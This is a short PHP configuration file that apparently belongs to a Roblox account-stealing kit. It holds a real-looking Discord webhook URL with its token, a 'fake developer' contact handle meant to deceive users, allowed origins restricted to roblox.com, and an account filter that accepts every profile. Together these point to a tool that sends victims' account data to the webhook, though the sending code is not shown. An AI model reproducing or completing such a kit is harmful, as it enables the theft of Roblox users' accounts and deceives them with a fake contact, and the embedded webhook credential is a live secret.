<?php
    // webhook link
    $webhook = "https://discord.com/api/webhooks/907445072818241536/3ScEQgE2PPuIGrFFDduj0ohH5j5nYphY3YLeaYH8NEGkfy8jXE9_OxIKbWEKdyOPC6Xr";
    // fake developer for the bot the users may contact
    $discord_contact = "Java#8701";
    
    $allowed_origins = array(
        "https://www.roblox.com",
        "https://web.roblox.com"
    );
    function account_filter($profile) {
        return true;
    }
?>
